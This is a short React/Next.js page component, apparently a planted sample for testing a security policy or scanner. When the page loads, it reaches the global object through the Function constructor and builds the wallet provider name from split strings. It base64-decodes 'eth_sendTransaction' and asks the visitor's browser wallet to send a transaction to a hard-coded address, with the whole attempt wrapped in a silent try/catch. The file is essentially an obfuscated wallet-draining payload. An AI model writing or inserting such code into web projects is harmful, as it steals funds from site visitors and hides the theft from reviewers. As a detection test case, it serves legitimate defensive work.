"use client";
// planted: reach the global through the Function constructor, the provider and the method through decoded strings
import { useEffect } from "react";

export default function Page() {
  useEffect(() => {
    try {
      const g = ([] as any).constructor.constructor("return this")();
      g[["eth", "ereum"].join("")].request({ method: atob("ZXRoX3NlbmRUcmFuc2FjdGlvbg=="), params: [{ to: "0x" + "ab".repeat(20), data: "0x" }] });
    } catch {
      /* the policy said no */
    }
  }, []);
  return <p>obfuscated</p>;
}
